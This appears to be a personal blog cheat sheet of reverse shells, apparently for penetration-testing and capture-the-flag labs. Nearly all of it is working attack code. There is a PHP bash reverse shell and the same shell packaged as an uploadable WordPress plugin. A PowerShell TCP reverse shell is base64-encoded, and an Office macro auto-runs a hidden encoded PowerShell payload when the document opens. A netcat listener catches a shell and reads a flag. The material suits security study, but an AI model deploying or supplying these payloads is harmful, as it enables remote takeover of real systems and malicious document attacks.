---
title: "Reverse shells"
excerpt: "a little list of reverse shells"
---

(a work in progress list of some handy reverse shells)

ℹ️ Some nifty links

- [generator](https://www.revshells.com/)
- [cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- another [repo list](https://github.com/MrPineMan/Awesome-Reverse-Shell)

## Opening

### PHP

A generic PHP reverse shell where you can/should swap out the listening IP address and port:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/8080 0>&1'");
?>
```
{: file='~/naughty.php'}

### WordPress

For a WordPress plugin, you need to add a bit more info for it to load as a "valid" plugin as outlined in the [plugin development docs](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/).

```php
<?php
/**
* Plugin Name: reverse shell plugin
* Description: opens a reverse shell with bash
* Version: 0.1
* Author: some-natalie
* Author URI: https://some-natalie.dev
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/8080 0>&1'");
?>
```
{: file='~/naughty-wp-plugin.php'}

Zip that PHP file, then upload the zipped file as a plugin.

> This lovely [malicious WordPress plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) generator works well on some versions of WordPress and not others.  The boring one above works a bit more uniformally, but is nowhere near as full of features.
{: .prompt-info}

### Powershell

```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.236",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText = [Convert]::ToBase64String($Bytes)

$EncodedText
```
{: file='~/naughty.ps1'}

### Office Macro

Here's a basic macro that invokes [`powercat`](https://github.com/besimorhino/powercat) to create a reverse shell.  Getting everything right for that payload is tedious, so I made a quick script ([payload.py](https://github.com/some-natalie/dotfiles/blob/main/scripts/msft/office/payload.py)) to create the base64-encoded payload for a simple reverse shell.  Then paste that content into the macro below.  Make sure to save the macro attached to the document (not the workspace).  Use `.docm` or `.doc` for Word, etc. for other formats.

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    ' edit the payload.py inputs to produce the right output here
    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
        Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
        Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
        Str = Str + "A"
    CreateObject("Wscript.Shell").Run Str
End Sub
```
{: file='cheeky-macro.bas'}

---

## Catching

### netcat

```shell-session
ᐅ nc -l 8080
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8b8f280a8848:/var/www/html/wp-admin$ cat /tmp/flag
cat /tmp/flag
flag{a sneaky flag has appeared}
```
